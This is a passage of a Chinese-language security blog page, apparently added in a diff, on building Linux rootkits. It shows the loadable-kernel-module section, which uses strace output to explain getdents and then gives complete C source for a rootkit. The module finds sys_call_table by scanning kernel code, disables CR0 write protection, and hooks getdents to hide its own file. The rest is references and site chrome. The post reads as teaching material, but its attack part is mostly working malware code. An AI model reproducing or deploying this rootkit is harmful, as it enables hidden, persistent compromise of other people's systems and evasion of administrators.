+<li><code>ps</code> 做的事情就是去讀 <code>/proc</code> 底下所有檔案，基本上是 <code>ls</code> 的強化版，那我們這次就先做 <code>ls</code> 隱藏檔案</li>
+<li>一樣用 <code>strace ls</code> 去看他呼叫了哪些 <code>syscall</code></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getdents(<span class="number">3</span>, <span class="comment">/* 16 entries */</span>, <span class="number">32768</span>)    = <span class="number">512</span></span><br><span class="line">getdents(<span class="number">3</span>, <span class="comment">/* 0 entries */</span>, <span class="number">32768</span>)     = <span class="number">0</span></span><br><span class="line"><span class="built_in">close</span>(<span class="number">3</span>)</span><br><span class="line">fstat(<span class="number">1</span>, &#123;st_mode=S_IFCHR|<span class="number">0620</span>, st_rdev=makedev(<span class="number">136</span>, <span class="number">1</span>), ...&#125;) = <span class="number">0</span></span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"a\thook.c\t initramfs\t    linux-5."</span>..., <span class="number">75</span>) = <span class="number">75</span></span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"attach\thook.so  initramfs.cpio.g"</span>..., <span class="number">90</span>) = <span class="number">90</span></span><br></pre></td></tr></table></figure>
+<p><code>getdents</code> 看起來是關鍵的 syscall，查看一下 man page</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       getdents, getdents64 - get directory entries</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       int getdents(unsigned int fd, struct linux_dirent *dirp,</span><br><span class="line">                    unsigned int count);</span><br><span class="line">       int getdents64(unsigned int fd, struct linux_dirent64 *dirp,</span><br><span class="line">                    unsigned int count);</span><br><span class="line"></span><br><span class="line">       Note: There are no glibc wrappers for these system calls; see NOTES.</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>getdents</code> 跑完後會把結果存到 <code>dirp</code> 裡面，那我們就遍歷 <code>dirp</code> 把要隱藏的丟掉就好了</li>
+<li>kernel 4.x.x 的參數是放在 stack 傳的，但 kernel 5.x.x 多包了一層 <code>do_syscall_64</code>，參數傳遞變成是透過 <code>struct pt_regs *regs</code> 這個結構去傳</li>
+</ul>
+<figure class="highlight c"><figcaption><span>rootkit.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kallsyms.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  d_ino;     <span class="comment">/* Inode number */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  d_off;     <span class="comment">/* Offset to next linux_dirent */</span></span><br><span class="line">    <span class="keyword">unsigned</span> short d_reclen;  <span class="comment">/* Length of this linux_dirent */</span></span><br><span class="line">    <span class="keyword">char</span>           d_name[];  <span class="comment">/* Filename (null-terminated) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> **sys_call_table;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> (*original_getdents) (struct pt_regs *regs);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writable_unlock</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> val = read_cr0() &amp; (~X86_CR0_WP);</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">"mov %0,%%cr0"</span>: <span class="string">"+r"</span> (val))</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writable_lock</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> val = read_cr0() | X86_CR0_WP;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">"mov %0,%%cr0"</span>: <span class="string">"+r"</span> (val))</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> *<span class="title">find</span> <span class="params">(<span class="keyword">uint8_t</span> *a, <span class="keyword">uint8_t</span> *b, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint8_t</span> *ptr = a, i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i++, ptr++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(ptr, b, len)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> *<span class="title">get_syscalltable</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lo, hi;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">"rdmsr"</span> : <span class="string">"=a"</span> (lo), <span class="string">"=d"</span> (hi) : <span class="string">"c"</span> (MSR_LSTAR))</span></span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> *entry_SYSCALL_64 = (<span class="keyword">uint8_t</span> *)(((<span class="keyword">uint64_t</span>)hi &lt;&lt; <span class="number">32</span>) | lo);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *ptr;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint8_t</span> do_syscall_64_inst[<span class="number">7</span>] = &#123;</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="comment">// mov rdi, rax</span></span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="comment">// mov rsi, rsp</span></span><br><span class="line">        <span class="number">0xe8</span>,             <span class="comment">// call do_syscall_64</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ptr = <span class="built_in">find</span>(entry_SYSCALL_64, do_syscall_64_inst, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *do_syscall_64 = (<span class="keyword">uint8_t</span> *)(ptr + <span class="number">11</span> + ((<span class="keyword">uint64_t</span>)<span class="number">0xffffffff00000000</span> | *(<span class="keyword">uint32_t</span> *)(ptr + <span class="number">7</span>)));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint8_t</span> sys_call_table_inst[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0xfd</span> <span class="comment">// mov rax, QWORD PTR [rdi*8-?]</span></span><br><span class="line">    &#125;;    </span><br><span class="line">    ptr = <span class="built_in">find</span>(do_syscall_64, sys_call_table_inst, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *sys_call_table = (<span class="keyword">uint8_t</span> *)((<span class="keyword">uint64_t</span>)<span class="number">0xffffffff00000000</span> | *(<span class="keyword">uint32_t</span> *)(ptr + <span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sys_call_table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILENAME <span class="meta-string">"rootkit.ko"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_getdents_hook</span><span class="params">(struct pt_regs *regs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> total = original_getdents(regs);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> fd = regs-&gt;di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> *<span class="title">dirent</span> = <span class="title">regs</span>-&gt;<span class="title">si</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> count = regs-&gt;dx;</span><br><span class="line">    <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (offset &lt; total) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> *<span class="title">ptr</span> = (<span class="title">struct</span> <span class="title">linux_dirent</span> *)((<span class="title">uint8_t</span> *)<span class="title">dirent</span> + <span class="title">offset</span>);</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> *<span class="title">next_ptr</span> = (<span class="title">struct</span> <span class="title">linux_dirent</span> *)((<span class="title">uint8_t</span> *)<span class="title">dirent</span> + <span class="title">offset</span> + <span class="title">ptr</span>-&gt;<span class="title">d_reclen</span>);</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strncmp</span>(ptr-&gt;d_name, FILENAME, <span class="built_in">strlen</span>(FILENAME)) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> reclen = ptr-&gt;d_reclen;</span><br><span class="line">            memmove(ptr, next_ptr, total - (offset + reclen));</span><br><span class="line">            total -= reclen;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            offset += ptr-&gt;d_reclen;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    sys_call_table = (<span class="keyword">void</span> **)get_syscalltable();</span><br><span class="line">    printk(KERN_INFO <span class="string">"sys_call_table = %llu\n"</span>, sys_call_table);</span><br><span class="line">    writable_unlock();</span><br><span class="line">    original_getdents = sys_call_table[__NR_getdents];</span><br><span class="line">    sys_call_table[__NR_getdents] = sys_getdents_hook;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rootkit_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    sys_call_table[__NR_getdents] = original_getdents;</span><br><span class="line">    writable_lock();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br></pre></td></tr></table></figure>
+<h3 id="DEMO-v2"><a class="header-anchor" href="#DEMO-v2"></a>DEMO</h3>
+<script id="asciicast-nySYMlkNUoKXyGZidEFOsN1PV" src="https://asciinema.org/a/nySYMlkNUoKXyGZidEFOsN1PV.js" async></script>
+<hr>
+<p>1: <a href="http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/">http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/</a><br>
+2: <a href="https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/">https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/</a><br>
+3: <a href="https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/gnu_linux.html">https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/gnu_linux.html</a><br>
+4: <a href="https://www.kernel.org/doc/Documentation/printk-formats.txt">https://www.kernel.org/doc/Documentation/printk-formats.txt</a><br>
+5: <a href="https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/">https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/</a></p>
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/pwn/" rel="tag">pwn</a>, <a class="has-link-grey -link" href="/tags/rootkit/" rel="tag">rootkit</a>, <a class="has-link-grey -link" href="/tags/security/" rel="tag">security</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/06/07/pyc/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">pyc 與他們的產地</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/06/07/security/writeups/blockchain-ctf/">
+                <span class="level-item">[Writeups] Security Innovation Blockchain CTF</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">Comments</h3>
+        
+<script>
+    var disqus_config = function () {
+        this.page.url = 'https://oalieno.github.io/2019/06/07/security/pwn/rootkit/';
+        this.page.identifier = '2019/06/07/security/pwn/rootkit/';
+    };
+    (function() {
+        var d = document, s = d.createElement('script');  
+        s.src = '//' + 'oalieno' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+<div id="disqus_thread">
+    
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+    </div>
+</div>
+</div>
+                
+
+
+
+
+<div class="column is-3-tablet is-3-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="https://www.gravatar.com/avatar/dd413429dc0e386a4dfdb890e39dd038?s=512" alt="oalieno">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        oalieno
+                    </p>
+                    
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Taiwan</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Posts
+                    </p>
+                    <a href="/archives">
+                        <p class="title has-text-weight-normal">
+                            23
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Categories
+                    </p>
+                    <a href="/categories">
+                        <p class="title has-text-weight-normal">
+                            8
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Tags
+                    </p>
+                    <a href="/tags">
+                        <p class="title has-text-weight-normal">
+                            37
+                        </p>
+                    </a>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/oalieno" target="_blank" rel="noopener" style="border-radius: 3px">
+                Follow</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Github" href="https://github.com/oalieno">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Ig" href="https://www.instagram.com/oalieno">
+                
+                <i class="fab fa-ig"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="In" href="https://www.linkedin.com/in/oalieno/">
+                
+                <i class="fab fa-linkedin"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+
+    <div class="card widget" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    Catalogue
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#隱之呼吸壹之型-PATH-Hijack">
+        <span class="has-mr-6">1</span>
+        <span>隱之呼吸壹之型 - PATH Hijack</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#條件">
+        <span class="has-mr-6">1.1</span>
+        <span>條件</span>
+        </a></li><li>
+        <a class="is-flex" href="#目標">
+        <span class="has-mr-6">1.2</span>
+        <span>目標</span>
+        </a></li><li>
+        <a class="is-flex" href="#手法">
+        <span class="has-mr-6">1.3</span>
+        <span>手法</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#隱之呼吸貳之型-LD-PRELOAD">
+        <span class="has-mr-6">2</span>
+        <span>隱之呼吸貳之型 - LD_PRELOAD</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#條件-v2">
+        <span class="has-mr-6">2.1</span>
+        <span>條件</span>
+        </a></li><li>
+        <a class="is-flex" href="#目標-v2">
+        <span class="has-mr-6">2.2</span>
+        <span>目標</span>
+        </a></li><li>
+        <a class="is-flex" href="#要-hook-哪個函式">
+        <span class="has-mr-6">2.3</span>
+        <span>要 hook 哪個函式</span>
+        </a></li><li>
+        <a class="is-flex" href="#dlsym">
+        <span class="has-mr-6">2.4</span>
+        <span>dlsym</span>
+        </a></li><li>
+        <a class="is-flex" href="#POC-原始碼">
+        <span class="has-mr-6">2.5</span>
+        <span>POC 原始碼</span>
+        </a></li><li>
+        <a class="is-flex" href="#編譯">
+        <span class="has-mr-6">2.6</span>
+        <span>編譯</span>
+        </a></li><li>
+        <a class="is-flex" href="#執行">
+        <span class="has-mr-6">2.7</span>
+        <span>執行</span>
+        </a></li><li>
+        <a class="is-flex" href="#DEMO">
+        <span class="has-mr-6">2.8</span>
+        <span>DEMO</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#隱之呼吸參之型-Loadable-Kernel-Module">
+        <span class="has-mr-6">3</span>
+        <span>隱之呼吸參之型 - Loadable Kernel Module</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#條件-v3">
+        <span class="has-mr-6">3.1</span>
+        <span>條件</span>
+        </a></li><li>
+        <a class="is-flex" href="#目標-v3">
+        <span class="has-mr-6">3.2</span>
+        <span>目標</span>
+        </a></li><li>
+        <a class="is-flex" href="#取得-sys-call-table">
+        <span class="has-mr-6">3.3</span>
+        <span>取得 sys_call_table</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#方法一">
+        <span class="has-mr-6">3.3.1</span>
+        <span>方法一</span>
+        </a></li><li>
+        <a class="is-flex" href="#方法二">
+        <span class="has-mr-6">3.3.2</span>
+        <span>方法二</span>
+        </a></li><li>
+        <a class="is-flex" href="#方法三">
+        <span class="has-mr-6">3.3.3</span>
+        <span>方法三</span>
+        </a></li><li>
+        <a class="is-flex" href="#方法四">
+        <span class="has-mr-6">3.3.4</span>
+        <span>方法四</span>
+        </a></li><li>
+        <a class="is-flex" href="#解讀上面的程式碼的步驟">
+        <span class="has-mr-6">3.3.5</span>
+        <span>解讀上面的程式碼的步驟</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#讓-sys-call-table-可以寫入">
+        <span class="has-mr-6">3.4</span>
+        <span>讓 sys_call_table 可以寫入</span>
+        </a></li><li>
+        <a class="is-flex" href="#要-hook-哪個-syscall">
+        <span class="has-mr-6">3.5</span>
+        <span>要 hook 哪個 syscall</span>
+        </a></li><li>
+        <a class="is-flex" href="#DEMO-v2">
+        <span class="has-mr-6">3.6</span>
+        <span>DEMO</span>
+        </a></li></ul></li></ul>
+            </div>
+        </div>
+    </div>
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Categories
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/algorithm/">
+            <span class="level-start">
+                <span class="level-item">algorithm</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/security/">
+            <span class="level-start">
+                <span class="level-item">security</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">14</span>
+            </span>
+        </a><ul><li>
+        <a class="level is-marginless" href="/categories/security/crypto/">
+            <span class="level-start">
+                <span class="level-item">crypto</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/security/news/">
+            <span class="level-start">
+                <span class="level-item">news</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/security/osint/">
+            <span class="level-start">
+                <span class="level-item">osint</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/security/pwn/">
+            <span class="level-start">
+                <span class="level-item">pwn</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">3</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/security/reverse/">
+            <span class="level-start">
+                <span class="level-item">reverse</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">3</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/security/writeups/">
+            <span class="level-start">
+                <span class="level-item">writeups</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">5</span>
+            </span>
+        </a></li></ul></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            Tag Cloud
+        </h3>
+        <a href="/tags/LINE-TAXI/" style="font-size: 10px;">LINE TAXI</a> <a href="/tags/adb/" style="font-size: 10px;">adb</a> <a href="/tags/algorithm/" style="font-size: 10px;">algorithm</a> <a href="/tags/android/" style="font-size: 13.33px;">android</a> <a href="/tags/blockchain/" style="font-size: 10px;">blockchain</a> <a href="/tags/burp/" style="font-size: 10px;">burp</a> <a href="/tags/crypto/" style="font-size: 11.67px;">crypto</a> <a href="/tags/ctf/" style="font-size: 18.33px;">ctf</a> <a href="/tags/drony/" style="font-size: 10px;">drony</a> <a href="/tags/frida/" style="font-size: 11.67px;">frida</a> <a href="/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/icarus/" style="font-size: 13.33px;">icarus</a> <a href="/tags/iterm2/" style="font-size: 10px;">iterm2</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/knapsack/" style="font-size: 10px;">knapsack</a> <a href="/tags/lattice/" style="font-size: 10px;">lattice</a> <a href="/tags/netflix/" style="font-size: 10px;">netflix</a> <a href="/tags/news/" style="font-size: 10px;">news</a> <a href="/tags/nord/" style="font-size: 10px;">nord</a> <a href="/tags/nox/" style="font-size: 10px;">nox</a> <a href="/tags/osint/" style="font-size: 10px;">osint</a> <a href="/tags/powerlevel10k/" style="font-size: 10px;">powerlevel10k</a> <a href="/tags/powerlevel9k/" style="font-size: 10px;">powerlevel9k</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a> <a href="/tags/pyc/" style="font-size: 10px;">pyc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/reverse/" style="font-size: 15px;">reverse</a> <a href="/tags/rootkit/" style="font-size: 10px;">rootkit</a> <a href="/tags/rsa/" style="font-size: 10px;">rsa</a> <a href="/tags/security/" style="font-size: 20px;">security</a> <a href="/tags/seo/" style="font-size: 10px;">seo</a> <a href="/tags/srop/" style="font-size: 10px;">srop</a> <a href="/tags/subset-sum/" style="font-size: 10px;">subset-sum</a> <a href="/tags/writeups/" style="font-size: 16.67px;">writeups</a> <a href="/tags/zimfw/" style="font-size: 10px;">zimfw</a> <a href="/tags/zsh/" style="font-size: 10px;">zsh</a>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            Recent
+        </h3>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-08-16T08:24:04.000Z">2020-08-16</time></div>
+                    <a href="/2020/08/16/security/news/clipboard-hijack/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Clipboard hijacking cryptocurrency malware on tradingview.com</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/news/">news</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-07-30T16:29:25.000Z">2020-07-31</time></div>
+                    <a href="/2020/07/31/security/osint/maltego/" class="title has-link-black-ter is-size-6 has-text-weight-normal">[小工具] Maltego</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/osint/">osint</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-06-09T14:29:00.000Z">2020-06-09</time></div>
+                    <a href="/2020/06/09/security/writeups/ais3-2020-preexam/" class="title has-link-black-ter is-size-6 has-text-weight-normal">[Writeups] AIS3 pre-exam 2020</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-05-04T06:33:13.000Z">2020-05-04</time></div>
+                    <a href="/2020/05/04/security/writeups/f-hash/" class="title has-link-black-ter is-size-6 has-text-weight-normal">[Writeups] VolgaCTF Quals 2020 - F-Hash</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-20T13:11:11.000Z">2020-03-20</time></div>
+                    <a href="/2020/03/20/security/crypto/knapsack-crypto/" class="title has-link-black-ter is-size-6 has-text-weight-normal">[後量子密碼] Knapsack Cryptosystem and Subset-Sum Problem</a>
